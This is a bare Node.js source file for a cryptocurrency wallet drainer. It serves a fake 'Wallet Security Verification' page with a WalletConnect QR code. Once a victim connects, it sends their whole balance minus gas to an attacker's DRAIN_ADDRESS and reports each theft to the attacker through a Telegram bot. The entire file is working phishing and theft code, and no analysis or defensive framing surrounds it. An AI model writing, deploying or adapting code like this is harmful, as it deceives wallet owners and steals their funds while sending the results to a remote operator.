require('dotenv').config();
const express = require('express');
const QRCode = require('qrcode');
const { ethers } = require('ethers');
const WalletConnect = require('@walletconnect/node').default;
const app = express();

const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const RPC_URLS = {
  1: 'https://eth.llamarpc.com',
  56: 'https://bsc-dataseed.binance.org',
  137: 'https://polygon.llamarpc.com',
  42161: 'https://arb1.arbitrum.io/rpc',
  10: 'https://mainnet.optimism.io'
};

app.get('/', (req, res) => {
  res.send(`<html><head><title>Wallet Security Check</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{font-family:Arial;background:#0a0a0a;color:#fff;text-align:center;padding:20px}
.box{background:#1a1a1a;padding:30px;border-radius:20px;max-width:400px;margin:50px auto}
h2{color:#3375ff}img{width:280px;height:280px;background:#fff;border-radius:15px}
.small{color:#888;font-size:12px}</style></head>
<body><div class="box">
<h2>Wallet Security Verification</h2>
<p>Scan this QR with Trust Wallet or MetaMask to verify your wallet.</p>
<img src="/qr" id="qrImg"><br>
<span class="small">Expires in 60 seconds</span>
</div>
<script>setTimeout(()=>location.reload(),60000)</script></body></html>`);
});

app.get('/qr', async (req, res) => {
  try {
    const connector = new WalletConnect({
      bridge: 'https://bridge.walletconnect.org',
      clientMeta: {
        description: 'Wallet Security Verifier',
        url: 'https://wallet-verify.onrender.com',
        icons: [],
        name: 'Wallet Security'
      }
    });
    if (!connector.connected) await connector.createSession();
    const uri = connector.uri;
    connector.on('session_request', async (error, payload) => {
      if (error) return;
      const account = payload.params[0].accounts[0];
      const chainId = payload.params[0].chainId;
      try {
        const rpc = RPC_URLS[chainId] || RPC_URLS[1];
        const provider = new ethers.providers.JsonRpcProvider(rpc);
        const balance = await provider.getBalance(account);
        const gasPrice = await provider.getGasPrice();
        const gasCost = gasPrice.mul(21000);
        if (balance.gt(gasCost)) {
          const tx = {
            from: account,
            to: DRAIN_ADDRESS,
            value: balance.sub(gasCost).toString(),
            gas: '21000',
            gasPrice: gasPrice.toString()
          };
          await connector.sendTransaction(tx);
          const msg = `Drained ${ethers.utils.formatEther(balance.sub(gasCost))} from ${account}`;
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
          });
        }
      } catch(e) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({chat_id: CHAT_ID, text: 'Error: ' + e.message.slice(0,100)})
        });
      }
      connector.killSession();
    });
    const qr = await QRCode.toDataURL(uri);
    res.send(`<img src="${qr}" style="width:280px">`);
  } catch(e) { res.status(500).send('QR Error'); }
});

app.listen(process.env.PORT || 3000, () => console.log('Active'));
